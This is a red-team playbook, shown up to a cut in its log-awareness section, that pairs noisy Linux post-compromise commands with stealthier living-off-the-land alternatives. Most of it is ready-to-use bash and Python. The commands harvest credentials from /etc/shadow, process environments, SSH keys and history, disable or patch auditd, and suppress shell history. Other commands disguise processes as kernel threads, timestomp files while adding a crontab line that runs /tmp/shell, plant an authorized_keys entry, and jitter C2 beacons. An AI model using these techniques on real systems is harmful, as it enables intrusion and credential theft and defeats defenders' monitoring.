# Linux Living-Off-The-Land Stealth Playbook

Red team automation reference: noisy commands mapped to their stealthy LOTL alternatives.

---

## 1. Command-by-Command Stealth Alternatives

### 1.1 `whoami` / `id` -- Identity Discovery

**Why it is noisy:** `whoami` and `id` are among the first commands EDR/auditd rules flag post-compromise. The `execve` syscall for these binaries is almost always monitored. Meterpreter's sequential `id` + `/etc/passwd` + `/proc/net/route` pattern is a known signature.

**Stealth alternatives:**

```bash
# Read directly from /proc -- no binary execution, no execve logged
cat /proc/self/status | grep -E '^(Uid|Gid|Groups):'

# Pure awk against /proc (avoids spawning cat/grep)
awk -F: 'END {print "uid:"u" gid:"g" groups:"gg}{if($1=="Uid"){split($2,a," ");u=a[1]}if($1=="Gid"){split($2,a," ");g=a[1]}if($1=="Groups"){gg=$2}}' /proc/self/status

# Environment variables (no syscall, already in memory)
echo $USER
echo $LOGNAME
echo $UID

# Bash built-in (no fork/exec)
echo "$UID / $EUID"

# Map UID to username via /etc/passwd without calling id
awk -F: -v uid="$(cat /proc/self/status | awk '/^Uid:/{print $2}')" '$3==uid{print $1}' /etc/passwd
```

**Key principle:** Reading `/proc/self/status` does NOT generate an `execve` audit event. The kernel serves this from memory. However, defenders using file-watch rules on `/proc/*/status` (Elastic Security rule: "Suspicious Proc Pseudo File System Enumeration") may detect rapid enumeration of multiple `/proc/*/status` files. Reading only `/proc/self/status` is far less suspicious than iterating all PIDs.

---

### 1.2 `cat /etc/passwd` -- User Enumeration

**Why it is noisy:** `/etc/passwd` is a commonly watched file in auditd configurations (`-w /etc/passwd -p r -k identity`). The `cat` binary execution also generates `execve` events.

**Stealth alternatives:**

```bash
# Use shell built-in redirection (no cat binary, no execve for cat)
while IFS=: read user x uid gid desc home shell; do
  echo "$user:$uid:$gid:$home:$shell"
done < /etc/passwd

# Read via awk (single process, common system utility)
awk -F: '{print $1":"$3":"$6":"$7}' /etc/passwd

# Enumerate users from /proc instead of /etc/passwd
# Each /proc/[pid]/status has Uid/Gid -- collect unique UIDs from running processes
for d in /proc/[0-9]*/status; do
  awk '/^Uid:/{print $2}' "$d" 2>/dev/null
done | sort -un

# Get login shells from /etc/shells to identify interactive users
# Then cross-reference with passwd
awk -F: '$7 !~ /nologin|false|sync|halt|shutdown/' /etc/passwd

# Use getent (uses NSS, works with LDAP/NIS too, less commonly monitored than direct file reads)
getent passwd
```

**Key insight:** The `openat()` syscall on `/etc/passwd` still fires regardless of method. The difference is whether you also trigger `execve` for `cat`. Using shell built-ins or `awk` (a legitimate admin tool) is less anomalous than `cat /etc/passwd` which is a textbook post-exploitation indicator.

---

### 1.3 `sudo -l` -- Sudo Privilege Check

**Why it is noisy:** `sudo -l` generates entries in `/var/log/auth.log` (or `/var/log/secure`). The sudo binary logs all invocations. Failed sudo attempts are high-priority alerts.

**Stealth alternatives:**

```bash
# Read the sudoers file directly (if readable -- misconfig check)
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# Check sudo group membership without running sudo
# Read /etc/group for sudo/wheel membership
grep -E '^(sudo|wheel):' /etc/group

# Check if current user is in sudo/wheel
id -nG 2>/dev/null | tr ' ' '\n' | grep -qE '^(sudo|wheel)$' && echo "SUDO GROUP MEMBER"

# /proc-based group check (avoids id binary)
awk '/^Groups:/{print $0}' /proc/self/status

# Check for NOPASSWD in readable sudoers files
find /etc/sudoers.d/ -readable -exec cat {} \; 2>/dev/null | grep -i nopasswd

# Check sudo token (is there a cached credential?)
# If sudo was recently used, the timestamp file exists
ls -la /run/sudo/ts/ 2>/dev/null
ls -la /var/db/sudo/lectured/ 2>/dev/null
ls -la /var/lib/sudo/lectured/ 2>/dev/null

# Check if sudo binary has SUID
ls -la $(which sudo) 2>/dev/null

# Check pkexec/polkit as alternative priv-esc path (often less monitored)
ls -la $(which pkexec) 2>/dev/null
cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null
```

**Key insight:** There is no completely silent equivalent to `sudo -l` because the sudo infrastructure is designed to log. The strategy is to gather the same information indirectly: check group membership, read sudoers if permissions allow, and look for cached tokens.

---

### 1.4 `find / -perm -4000` -- SUID Enumeration

**Why it is noisy:** A recursive `find` from `/` generates massive filesystem I/O, thousands of `getdents`/`stat`/`openat` syscalls, and is a textbook privesc indicator. The scan duration and I/O pattern are anomalous.

**Stealth alternatives:**

```bash
# Targeted scan of known SUID locations only (90% coverage, 1% noise)
for dir in /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /bin /sbin /usr/lib /usr/libexec /snap/bin; do
  find "$dir" -maxdepth 1 -perm -4000 -type f 2>/dev/null
done

# Check specific GTFOBins SUID candidates directly (zero find noise)
for bin in nmap vim find bash more less nano cp mv awk python3 python perl ruby lua env ftp flock; do
  p=$(which "$bin" 2>/dev/null) && [ -u "$p" ] && echo "SUID: $p"
done

# Use package manager to diff installed vs expected (discovers SUID anomalies)
# Debian/Ubuntu:
dpkg --verify 2>/dev/null | grep '^..5' | grep -E '/s?bin/'
# RHEL/CentOS:
rpm -Va 2>/dev/null | grep '^..5' | grep -E '/s?bin/'

# Read /proc/self/status for capabilities instead of SUID
grep Cap /proc/self/status

# Decode capabilities
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null
```

**Key insight:** Never scan the entire filesystem. Target the 8-10 directories where SUID binaries actually live. Better yet, check specific known-exploitable binaries directly -- this generates the same number of syscalls as a normal admin checking if a tool is installed.

---

### 1.5 `getcap -r /` -- Capability Enumeration

**Why it is noisy:** Same problem as SUID -- recursive filesystem walk from root. `getcap` itself may be monitored.

**Stealth alternatives:**

```bash
# Targeted capability checks on known-dangerous binaries
for bin in python3 python2 perl ruby node php vim tar gdb ping tcpdump openssl; do
  p=$(which "$bin" 2>/dev/null) && getcap "$p" 2>/dev/null
done

# Check capabilities via /proc for current process
grep Cap /proc/self/status
# CapInh: inherited capabilities
# CapPrm: permitted capabilities
# CapEff: effective capabilities
# CapBnd: bounding set
# CapAmb: ambient capabilities

# Decode without capsh (manual hex decode)
# CapEff: 0000000000000000 means no special caps
# CapEff: 0000003fffffffff means full caps (root equivalent)

# Use filecap from libcap-ng (alternative tool, less commonly monitored)
filecap /usr/bin 2>/dev/null
filecap /usr/sbin 2>/dev/null

# Targeted scan with depth limit
find /usr -maxdepth 3 -type f -exec getcap {} \; 2>/dev/null

# Check for cap_setuid specifically (the money capability)
getcap /usr/bin/* /usr/sbin/* 2>/dev/null | grep -i setuid
```

**Key insight:** `cap_setuid` and `cap_setgid` are the high-value targets. Focus queries on known binary paths rather than recursive discovery.

---

### 1.6 `ps aux` -- Process Enumeration

**Why it is noisy:** `ps` execution generates `execve` events and reads from `/proc` internally. Monitoring may flag `ps aux` specifically.

**Stealth alternatives:**

```bash
# Direct /proc enumeration (no binary execution)
for pid in /proc/[0-9]*/; do
  comm=$(cat "$pid/comm" 2>/dev/null)
  cmdline=$(tr '\0' ' ' < "$pid/cmdline" 2>/dev/null)
  uid=$(awk '/^Uid:/{print $2}' "$pid/status" 2>/dev/null)
  echo "PID:${pid##/proc/} UID:$uid CMD:$comm ARGS:$cmdline"
done

# Quick process listing from /proc/sched_debug (requires root, less common)
cat /proc/sched_debug 2>/dev/null | grep -E '^\s+\S+\s+[0-9]+' | awk '{print $1, $2}'

# Targeted: just check for specific defensive processes
for proc in auditd ossec wazuh falcon crowdstrike sysmon aide tripwire rkhunter; do
  pgrep -x "$proc" >/dev/null 2>&1 && echo "DEFENSIVE: $proc running"
done

# /proc/self/status to understand your own context
cat /proc/self/status 2>/dev/null

# List only processes with network sockets (targeted, not blanket)
ls -la /proc/[0-9]*/fd/ 2>/dev/null | grep socket

# pspy-style approach: monitor /proc for new processes without root
# (Watch for PID directory creation in /proc)
```

**Warning:** Elastic Security has a rule "Suspicious Proc Pseudo File System Enumeration" that detects rapid iteration over `/proc/*/cmdline`, `/proc/*/status`, etc. If you enumerate all PIDs, add jitter (random delays) between reads. Or read only specific PIDs of interest after discovering them via `/proc/sched_debug` or by checking specific known service names.

---

### 1.7 `ss -tlnp` / `netstat -tlnp` -- Network Enumeration

**Why it is noisy:** `ss` and `netstat` are commonly monitored binaries. Their execution via `execve` is flagged.

**Stealth alternatives:**

```bash
# TCP connections from /proc (no binary execution)
cat /proc/net/tcp

# Human-readable TCP parser via awk
awk 'function hextodec(str, ret,n,i,k,c){
  ret=0; n=length(str)
  for(i=1;i<=n;i++){c=tolower(substr(str,i,1));k=index("123456789abcdef",c);ret=ret*16+k}
  return ret
}
function getIP(str, ret,i){
  ret=hextodec(substr(str,index(str,":")-2,2))
  for(i=5;i>0;i-=2) ret=ret"."hextodec(substr(str,i,2))
  ret=ret":"hextodec(substr(str,index(str,":")+1,4))
  return ret
}
NR>1{local=getIP($2);remote=getIP($3);state=$4
  if(state=="0A") st="LISTEN"
  else if(state=="01") st="ESTABLISHED"
  else st=state
  print local" -> "remote" ["st"]"
}' /proc/net/tcp

# UDP sockets
cat /proc/net/udp

# Unix sockets
cat /proc/net/unix

# ARP cache (LAN host discovery)
cat /proc/net/arp

# Routing table
cat /proc/net/route

# Network interfaces and stats
cat /proc/net/dev

# IPv6 connections
cat /proc/net/tcp6
cat /proc/net/udp6

# DNS resolver config (no binary needed)
cat /proc/net/if_inet6 2>/dev/null
```

**Key insight:** `/proc/net/tcp` gives you everything `ss -tlnp` gives you. The addresses are hex-encoded (little-endian for IPv4). State `0A` = LISTEN, `01` = ESTABLISHED, `06` = TIME_WAIT. Port and IP require hex-to-decimal conversion. The awk one-liner above handles this.

---

### 1.8 `cat /etc/shadow` -- Credential Access

**Why it is noisy:** `/etc/shadow` is one of the most heavily monitored files on any system. Auditd rules like `-w /etc/shadow -p r -k credential_access` are nearly universal. Any read access generates high-severity alerts.

**Stealth alternatives:**

```bash
# Realistic assessment: if you have root, you can read it.
# The question is HOW you read it to minimize detection surface.

# Use shell redirection instead of cat (avoids cat execve)
hashes=""
while IFS=: read user hash rest; do
  [ "${hash:0:1}" != "!" ] && [ "${hash}" != "*" ] && [ -n "$hash" ] && \
  hashes="$hashes\n$user:$hash"
done < /etc/shadow

# Read via /proc/self/fd trick
exec 3< /etc/shadow
while IFS= read -r line <&3; do echo "$line"; done
exec 3<&-

# Alternative credential sources that may be LESS monitored:
# Memory-based credential harvesting
strings /proc/[0-9]*/environ 2>/dev/null | grep -iE '(pass|key|token|secret|cred)='

# SSH keys (often less monitored than /etc/shadow)
find /home -name 'authorized_keys' -o -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
find /root/.ssh/ -type f 2>/dev/null

# Bash history for credential leaks
cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -iE '(pass|key|token|mysql|ssh|ftp)'

# Credential files in common locations
find /opt /var /etc /home -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '.env' 2>/dev/null | \
  xargs grep -liE '(password|passwd|secret|token|api.?key)' 2>/dev/null

# Database credential files
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /etc/mysql/debian.cnf 2>/dev/null

# Swap and memory artifacts
strings /dev/mem 2>/dev/null | grep -i pass
strings /proc/kcore 2>/dev/null | grep -i password

# /proc/[pid]/environ for running process credentials
for pid in /proc/[0-9]*/; do
  env=$(cat "${pid}environ" 2>/dev/null | tr '\0' '\n' | grep -iE '(pass|key|token|secret)')
  [ -n "$env" ] && echo "PID ${pid}: $env"
done
```

**Key insight:** Direct `/etc/shadow` access is almost always logged. The stealthier approach is to harvest credentials from alternative sources: process environment variables (`/proc/*/environ`), application config files, SSH keys, bash history, and database configs. These are often far less monitored.

---

### 1.9 `uname -a` / `hostname` -- System Information

**Why it is noisy:** `uname` and `hostname` generate `execve` events. They are part of known enumeration fingerprints.

**Stealth alternatives:**

```bash
# Kernel version from /proc (no binary execution)
cat /proc/version
cat /proc/sys/kernel/osrelease
cat /proc/sys/kernel/hostname

# System architecture
cat /proc/sys/kernel/arch 2>/dev/null

# Distribution info
cat /etc/os-release 2>/dev/null
cat /etc/lsb-release 2>/dev/null
cat /etc/issue 2>/dev/null

# Hardware info from /proc
cat /proc/cpuinfo | head -20
cat /proc/meminfo | head -5

# Uptime
cat /proc/uptime

# Loaded kernel modules
cat /proc/modules

# Mount points
cat /proc/mounts

# Bash built-in: $HOSTNAME
echo "$HOSTNAME"
echo "$HOSTTYPE"
echo "$MACHTYPE"
echo "$OSTYPE"

# Domain info
cat /proc/sys/kernel/domainname 2>/dev/null
cat /etc/resolv.conf
```

**Key insight:** Almost all `uname -a` output is available from `/proc` or environment variables. The kernel provides `/proc/version`, `/proc/sys/kernel/osrelease`, and `/proc/sys/kernel/hostname` without any binary execution.

---

### 1.10 `find / -writable` -- Writable File Discovery

**Why it is noisy:** Full filesystem traversal. Massive I/O, thousands of stat() calls, obvious enumeration behavior.

**Stealth alternatives:**

```bash
# Targeted: check only high-value writable locations
for dir in /tmp /var/tmp /dev/shm /var/www /opt /var/backups /var/spool/mail; do
  [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# Check specific privesc-relevant paths
for f in /etc/crontab /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/profile /etc/profile.d /etc/bash.bashrc /etc/environment; do
  [ -w "$f" ] && echo "WRITABLE: $f"
done

# Writable systemd service files (direct privesc path)
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null

# Writable PATH directories (command hijacking)
echo $PATH | tr ':' '\n' | while read dir; do
  [ -w "$dir" ] && echo "WRITABLE PATH DIR: $dir"
done

# World-writable files in specific dirs only
find /etc /usr/local -perm -0002 -type f 2>/dev/null

# Writable SUID binaries (jackpot)
for dir in /usr/bin /usr/sbin /bin /sbin; do
  find "$dir" -perm -4000 -writable 2>/dev/null
done

# Check if /etc/passwd is writable (classic privesc)
[ -w /etc/passwd ] && echo "CRITICAL: /etc/passwd is writable"
```

**Key insight:** Never scan from `/`. Target the directories that matter for privilege escalation: cron dirs, systemd dirs, PATH dirs, web roots, and writable config files. This generates 100x fewer syscalls.

---

### 1.11 `crontab -l` / `cat /etc/crontab` -- Scheduled Task Enumeration

**Why it is noisy:** `crontab -l` may log via `execve`. Reading crontab files may be watched.

**Stealth alternatives:**

```bash
# User crontabs (direct file read, no crontab binary)
cat /var/spool/cron/crontabs/$(whoami) 2>/dev/null
cat /var/spool/cron/$(whoami) 2>/dev/null      # RHEL path

# System crontabs
cat /etc/crontab 2>/dev/null
ls /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null
ls /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null

# Systemd timers (modern alternative to cron -- often overlooked by defenders)
# These are less commonly monitored than cron
systemctl list-timers --all 2>/dev/null

# Direct file read of timer units
find /etc/systemd/system /usr/lib/systemd/system -name '*.timer' -exec cat {} \; 2>/dev/null

# AT jobs
ls /var/spool/at/ 2>/dev/null && cat /var/spool/at/* 2>/dev/null
atq 2>/dev/null

# Anacron
cat /etc/anacrontab 2>/dev/null
ls /var/spool/anacron/ 2>/dev/null

# Incron (inotify-based cron)
cat /etc/incron.d/* 2>/dev/null
cat /var/spool/incron/* 2>/dev/null

# Check for running cron-like processes
ls -la /proc/[0-9]*/exe 2>/dev/null | grep -iE '(cron|atd|systemd-timer)'
```

**Key insight:** Do not forget systemd timers -- they are increasingly common and often have weaker monitoring than cron. Also check anacron and incron. Reading `/var/spool/cron/crontabs/` directly avoids the `crontab` binary execution.

---

### 1.12 `cat /etc/ssh/sshd_config` -- SSH Configuration Review

**Why it is noisy:** SSH config files may be watched. The read pattern combined with other enumeration is a signature.

**Stealth alternatives:**

```bash
# Shell built-in read (avoids cat execve)
while IFS= read -r line; do
  case "$line" in
    \#*|"") continue;;
    *) echo "$line";;
  esac
done < /etc/ssh/sshd_config

# Check only the interesting directives
grep -E '^(PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|AuthorizedKeysFile|PermitEmptyPasswords|X11Forwarding|AllowUsers|AllowGroups|Port|ListenAddress)' /etc/ssh/sshd_config 2>/dev/null

# Check for SSH config includes
grep -i '^Include' /etc/ssh/sshd_config 2>/dev/null

# Running SSH config from process (avoids file read entirely)
# Get the actual runtime config from the process cmdline
cat /proc/$(pgrep -o sshd)/cmdline 2>/dev/null | tr '\0' ' '

# Check authorized_keys locations
find /home /root -name 'authorized_keys' -type f 2>/dev/null

# SSH host keys (useful for MitM or lateral movement)
ls -la /etc/ssh/ssh_host_*_key 2>/dev/null
```

---

### 1.13 `ssh-keygen` on Target -- Key Generation

**Why it is noisy:** `ssh-keygen` execution is logged. Key generation on a compromised host is suspicious. New files in `~/.ssh/` trigger file integrity monitoring.

**Stealth alternatives:**

```bash
# Generate keys with OpenSSL instead (different binary, often not monitored the same way)
openssl genrsa -out /dev/shm/.k 2048 2>/dev/null
openssl rsa -in /dev/shm/.k -pubout -out /dev/shm/.k.pub 2>/dev/null

# Generate Ed25519 key with OpenSSL
openssl genpkey -algorithm ed25519 -out /dev/shm/.k 2>/dev/null
openssl pkey -in /dev/shm/.k -pubout -out /dev/shm/.k.pub 2>/dev/null

# Convert OpenSSL key to SSH format
ssh-keygen -y -f /dev/shm/.k > /dev/shm/.k.ssh.pub 2>/dev/null

# Generate key entirely in memory using Python (no file written to disk)
python3 -c "
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives import serialization
k=ed25519.Ed25519PrivateKey.generate()
print(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.OpenSSH,serialization.NoEncryption()).decode())
" 2>/dev/null

# Best practice: generate keys OFFSITE and inject the public key only
# Append to authorized_keys via echo (avoids ssh-keygen entirely)
echo 'ssh-ed25519 AAAA...your_key... operator@c2' >> /target/.ssh/authorized_keys

# Use /dev/shm (tmpfs, RAM-backed, not written to disk)
# Keys in /dev/shm disappear on reboot
```

**Key insight:** Generate keys on your C2 server, not on the target. Transfer only the public key to `authorized_keys`. If you must generate on target, use OpenSSL (different audit profile than `ssh-keygen`) and store in `/dev/shm` (RAM-backed filesystem, no disk forensics).

---

### 1.14 `echo 'pass' | sudo -S -l` -- Password Testing

**Why it is noisy:** Failed sudo attempts generate high-priority auth log entries. Multiple attempts trigger brute-force detection. `sudo` logs ALL invocations to `/var/log/auth.log`.

**Stealth alternatives:**

```bash
# su is sometimes less monitored than sudo
# (still logs to auth.log, but may lack specific detection rules)
su -c "id" targetuser 2>/dev/null

# Check if a password hash is crackable offline instead
# Extract hash from /etc/shadow (if readable) and crack on YOUR machine
grep '^targetuser:' /etc/shadow 2>/dev/null

# Test password via SSH to localhost (may have different monitoring)
sshpass -p 'password' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@127.0.0.1 id 2>/dev/null

# PAM-based check using Python (avoids sudo binary entirely)
python3 -c "
import pam
p = pam.pam()
result = p.authenticate('username', 'password')
print('Valid' if result else 'Invalid')
" 2>/dev/null

# Check for password reuse in process environments
strings /proc/[0-9]*/environ 2>/dev/null | grep -i pass

# Check for cached Kerberos tickets
klist 2>/dev/null
ls -la /tmp/krb5cc_* 2>/dev/null

# Check for sudo timestamp tokens (session may still be valid)
# Recent sudo use means the timestamp is cached
find /run/sudo/ts/ /var/run/sudo/ts/ /var/db/sudo/ -type f 2>/dev/null
```

**Key insight:** Never brute-force sudo on the target. Extract hashes and crack offline. Check for cached tokens first. If password testing is required, a single attempt via `su` to a non-root account may be less suspicious than `sudo -S`.

---

## 2. Operational Patterns

### 2.1 Auditd Evasion

**What auditd monitors (the defender baseline):**

Commonly monitored syscalls (highest priority first):
- `execve` -- ALL command execution (the single most important syscall for defenders)
- `connect` -- ALL outbound network connections
- `openat` / `open` -- file access operations
- `socket` -- socket creation (UDP shells detected via `a1=="2"`)
- `mprotect` -- memory permission changes (RWX = `a2=="7"` flags Meterpreter)
- `rmdir`, `unlink`, `rename` -- file deletion/modification
- `ptrace` -- debugger attachment (syscall values 0x4, 0x5, 0x6)

Commonly watched files:
- `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` -- credential and privilege files
- `/etc/ssh/sshd_config` -- SSH configuration
- `/etc/audit/audit.rules`, `/etc/audit/auditd.conf` -- audit config self-protection
- `/proc/net/route` -- network routing (part of Meterpreter signature)
- `/etc/machine-id` -- system identification

**What is generally NOT monitored (stealth zones):**

- `/proc/self/*` reads (your own process info -- too much noise to log)
- `/proc/net/tcp`, `/proc/net/udp` (network info without binary execution)
- `/proc/version`, `/proc/sys/kernel/*` (system info reads)
- `/dev/shm/*` operations (RAM-backed tmpfs, often excluded from FIM)
- Shell built-in operations (no `execve`, invisible to syscall audit rules)
- Environment variable reads (`$USER`, `$HOME`, `$HOSTNAME`)

**Bypassing auditd (when you have root):**

```bash
# Check current audit rules first
auditctl -l 2>/dev/null

# Check if auditd is running
pgrep -x auditd >/dev/null && echo "auditd RUNNING"

# Check if rules are immutable (auditctl -e 2)
auditctl -s 2>/dev/null | grep enabled

# Technique: apollon -- /proc/pid/mem patching (advanced)
# Write to /proc/[auditd-pid]/mem to patch recvfrom() GOT entry
# Redirects to shellcode that filters events by keyword/PID
# Bypasses RELRO because kernel /proc/pid/mem handler ignores page permissions
# Detection: Write access to /proc/[auditd-pid]/mem, missing sequential event IDs

# Technique: daphne -- ptrace-based interception
# Attach to auditd via PTRACE_ATTACH, intercept recvfrom() syscall
# Filter/replace audit messages before auditd processes them
# Detection: ptrace syscall rules fire heavily, massive audit event flood

# Simpler: rule deletion (noisy but effective)
auditctl -D              # Delete all rules
auditctl -e 0            # Disable audit system

# Mitigation awareness: Yama ptrace_scope
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = no restrictions, 1 = parent-only, 2 = admin-only, 3 = no ptrace at all
```

**Operational note:** If `auditctl -s` shows `enabled 2`, the audit configuration is **immutable** and cannot be changed without a reboot. Plan accordingly.

---

### 2.2 Shell History Evasion

**Pre-operation setup (source as a script, not typed directly):**

```bash
#!/bin/bash
# Save as /dev/shm/.profile and source it: . /dev/shm/.profile
# The source command itself may appear in history, so use:
# { . /dev/shm/.profile; }  (with leading space if HISTCONTROL=ignorespace)

# Disable bash history
set +o history
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# Prevent other tool histories
export LESSHISTFILE=/dev/null
export LESSHISTSIZE=0
export MYSQL_HISTFILE=/dev/null
export PSQL_HISTORY=/dev/null

# Python history suppression
export PYTHONSTARTUP=/dev/null
export PYTHONDONTWRITEBYTECODE=True

# Vim info suppression
alias vim='vim -i NONE'
alias vi='vim -i NONE'

# SSH OPSEC
alias ssh='ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'

# Unset connection indicators
unset SSH_CLIENT SSH_CONNECTION SSH_TTY

# Clean up the profile script itself
rm -f /dev/shm/.profile
```

**Leading space trick (simplest method):**

```bash
# If HISTCONTROL contains "ignorespace" or "ignoreboth" (default on most distros):
 whoami          # Note the leading space -- not saved to history
 cat /etc/passwd # Leading space
```

**Verify before relying on it:**

```bash
echo $HISTCONTROL    # Should contain "ignorespace" or "ignoreboth"
echo $PROMPT_COMMAND  # Check if commands are logged to syslog via PROMPT_COMMAND
lsattr ~/.bash_history  # Check for append-only (a) or immutable (i) flags
```

**Critical limitation:** Shell history evasion does NOT prevent:
- `auditd` from logging `execve` syscalls
- EDR/XDR kernel-level telemetry (eBPF hooks)
- `PROMPT_COMMAND` syslog forwarding
- Kernel-level command logging
- Hardware keyloggers

**SSH stealth connection:**

```bash
# Connect without appearing in utmp/wtmp (invisible to w/who/last)
ssh -T user@target 'bash -i'

# Alternatively, use -o with no pseudo-terminal allocation
ssh -o 'RequestTTY=no' user@target 'bash -i'
```

---

### 2.3 Process Tree Discipline

**Suspicious process trees that trigger alerts:**

```
# BAD: Web server spawning shells
apache2 -> /bin/sh -> whoami
nginx -> bash -> curl http://evil.com

# BAD: Unusual parent for enumeration tools
cron -> sh -> find / -perm -4000
python3 -> bash -> cat /etc/shadow

# BAD: Deep nesting
sshd -> bash -> bash -> bash -> python3 -> bash
```

**Stealth process tree patterns:**

```bash
# Re-parent your process using double-fork (orphan adopted by init/systemd)
( ( your_command ) & )

# Use exec to replace the current shell (no child, same PID)
exec -a "[kworker/0:1-events]" bash  # Rename to look like kernel thread

# Rename process to blend in
exec -a "sshd: user@pts/0" bash
exec -a "[kworker/u8:2-flush-253:0]" python3 -c "your_code"

# Use nohup + disown to detach from parent
nohup bash -c 'your_commands' &>/dev/null & disown

# Fork to background and setsid (new session, no controlling terminal)
setsid bash -c 'your_commands' &>/dev/null &

# On Linux, prctl(PR_SET_NAME) changes /proc/self/comm
python3 -c "
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library('c'))
libc.prctl(15, b'[kworker/0:0]', 0, 0, 0)
import time; time.sleep(99999)
"
```

**Key principle:** If your implant spawns from `sshd -> bash`, that is expected. If it spawns from `apache2 -> bash`, that is anomalous. Always ensure your process tree looks legitimate for the context. Kernel thread names in brackets `[kworker/...]` are good camouflage for long-running processes.

---

### 2.4 Timing Patterns

**What triggers behavioral analysis:**

- Rapid sequential command execution (< 100ms between commands) -- indicates automation/scripting
- Burst of enumeration commands within seconds -- matches LinPEAS/linEnum patterns
- Activity at unusual hours (e.g., 03:00 on a web server with no cron jobs at that time)
- Perfectly regular intervals (exactly 60s between beacons -- no human does this)

**OPSEC timing guidelines:**

```bash
# Add random jitter between commands (1-5 seconds for enumeration)
sleep $(( RANDOM % 5 + 1 ))

# For C2 beacons: use configurable jitter (standard in Cobalt Strike, Sliver, Mythic)
# Sliver default: sleep interval + up to 30% jitter
# Cobalt Strike: Malleable C2 profiles define sleep + jitter

# Spread enumeration over minutes, not seconds
# Instead of running 14 commands in 2 seconds, spread over 5-10 minutes

# Match the target's activity patterns
# If the server is a web app, enumerate during business hours
# If it's a CI/CD runner, enumerate during build windows

# Avoid perfectly periodic activity
# WRONG: beacon every 60.000 seconds
# RIGHT: beacon every 45-75 seconds (50% jitter)

# Example: jittered enumeration loop
for cmd in "cat /proc/self/status" "cat /proc/net/tcp" "cat /proc/version"; do
  eval "$cmd" 2>/dev/null
  sleep $(awk 'BEGIN{srand();printf "%.1f", 2+rand()*6}')  # 2.0-8.0 second random delay
done
```

---

### 2.5 File Access Patterns -- Evading File Integrity Monitoring

**How FIM tools work:**
- **AIDE**: Creates baseline database of file checksums. Periodic comparison (typically daily cron). Monitors metadata changes (size, mtime, ctime, permissions, checksum).
- **OSSEC/Wazuh Syscheck**: Runs every 6 hours by default. Monitors configured directories for changes.
- **Tripwire**: Baseline database compared against current state. Reports added/modified/deleted files.

**Evasion strategies:**

```bash
# 1. Timestomping -- restore original timestamps after modification
MTIME=$(stat -c %Y /target/file)
ATIME=$(stat -c %X /target/file)
# ... modify file ...
touch -m -d @$MTIME /target/file
touch -a -d @$ATIME /target/file

# Full timestamp preservation wrapper
stomp() {
  local file="$1"
  local ts_mod=$(stat -c %Y "$file")
  local ts_acc=$(stat -c %X "$file")
  shift
  "$@"  # Run the command
  touch -m -d @$ts_mod "$file"
  touch -a -d @$ts_acc "$file"
}
# Usage: stomp /etc/crontab bash -c 'echo "* * * * * root /tmp/shell" >> /etc/crontab'

# 2. Copy timestamps from a reference file
touch -r /etc/hostname /your/implant/file

# 3. Use /dev/shm for temporary files (RAM-backed, not in FIM scope)
# Most FIM configs do NOT monitor /dev/shm, /tmp, /proc, /sys
echo "payload" > /dev/shm/.cache_lock

# 4. Read files without modifying atime (if noatime not set)
# Use O_NOATIME flag via python
python3 -c "
import os
fd = os.open('/etc/shadow', os.O_RDONLY | os.O_NOATIME)
data = os.read(fd, 65536)
os.close(fd)
print(data.decode())
" 2>/dev/null

# 5. Operate between FIM scan windows
# AIDE typically runs daily via cron
# OSSEC Syscheck runs every 6 hours (21600 seconds) by default
# Make changes, achieve objective, revert changes before next scan

# 6. Modify files that are NOT in the FIM baseline
# FIM only monitors configured paths -- check what is monitored:
cat /etc/aide.conf 2>/dev/null | grep -v '^#' | grep '/'
cat /var/ossec/etc/ossec.conf 2>/dev/null | grep -A2 syscheck
cat /etc/tripwire/twpol.txt 2>/dev/null | head -50
```

**Files typically NOT in FIM scope:**
- `/dev/shm/*` -- RAM-backed tmpfs
- `/tmp/*`, `/var/tmp/*` -- temporary directories
- `/proc/*`, `/sys/*` -- virtual filesystems
- `/run/*` -- runtime data
- User home directory dotfiles (sometimes excluded for performance)
- Application log files under `/var/log/` (monitored differently, via log forwarding)

---

### 2.6 Log Awareness

**What generates syslog entries:**

| Action | Log Location | Always Logged? |
|--------|-------------|----------------|
| SSH login | `/var/log/auth.log` or `/var/log/secure` | Yes |
| sudo invocation | `/var/log/auth.log` or `/var/log/secure` | Yes |
| su invocation | `/var/log/auth.log` | Yes |
| cron execution | `/var/log/cron` or `/var/log/syslog` | Yes |
| su/sudo failure | `/var/log/auth.log` | Yes (HIGH PRIORITY) |
| Package install | `/var/log/apt/history.log` or `/var/log/yum.log` | Yes |
| Systemd service start/stop | `journalctl` | Yes |
| Kernel messages | `/var/log/kern.log` or `dmesg` | Yes |
| Login/logout | `/var/log/wtmp` (binary), `/var/log/lastlog` | Yes |
| Currently logged in | `/var/run/utmp` | Yes |

**What typically does NOT generate syslog entries:**

- Reading files via shell built-ins or `/proc`
- Environment variable operations
- Most file reads (unless auditd watches them specifically)
- Process-internal operations (memory operations, IPC)
- Reads from `/proc/self/*`, `/proc/net/*`
- Operations in `/dev/shm`, `/tmp` (unless specifically watched)

**Check logging configuration before operating:**

```bash
# What syslog daemon is running?
pgrep -la 'rsyslog\|syslog-ng\|journald'

# What is configured to log?
cat /etc/rsyslog.conf 2>/dev/null | grep -v '^#' | grep -v '^$'
